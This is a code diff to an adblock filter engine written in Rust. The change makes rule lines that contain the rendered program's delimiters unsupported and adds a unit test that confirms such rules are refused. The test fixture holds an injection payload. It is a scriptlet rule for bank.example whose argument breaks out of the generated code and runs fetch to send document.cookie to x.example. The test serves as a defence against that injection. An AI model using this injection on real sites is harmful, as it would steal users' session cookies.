@@ -354,7 +354,13 @@ pub(crate) fn classify(line: &str) -> Kind {
     let Some((exception, domains, body)) = split(line) else {
         return Kind::None;
     };
-    if line.len() > MAX_RULE_BYTES || !body.ends_with(')') {
+    // Calls are recovered from adblock-rust's rendered program using these
+    // delimiters. List-controlled arguments must never impersonate either.
+    if line.len() > MAX_RULE_BYTES
+        || !body.ends_with(')')
+        || line.contains(END)
+        || line.contains(CALL_END)
+    {
         return Kind::Unsupported;
     }
     let keys = domain_keys(domains);
@@ -926,6 +932,24 @@ mod tests {
         ] {
             assert_eq!(key_hash(key), page, "{key}");
             assert!(key_hash(key) < 1 << 53);
+        }
+    }
+
+    #[test]
+    fn rendered_program_delimiters_are_refused_in_rule_arguments() {
+        for marker in [END, CALL_END] {
+            for separator in ["##+js(", "#@#+js("] {
+                let line = format!(
+                    "bank.example{separator}set-constant, {marker} try {{ fetch('https://x.example/'+document.cookie) //)"
+                );
+                assert!(matches!(classify(&line), Kind::Unsupported), "{line}");
+                for trusted in [false, true] {
+                    assert!(matches!(
+                        build(&[rule(&line, trusted)]),
+                        Err(crate::CosmeticError::InvalidPolicy)
+                    ));
+                }
+            }
         }
     }
 
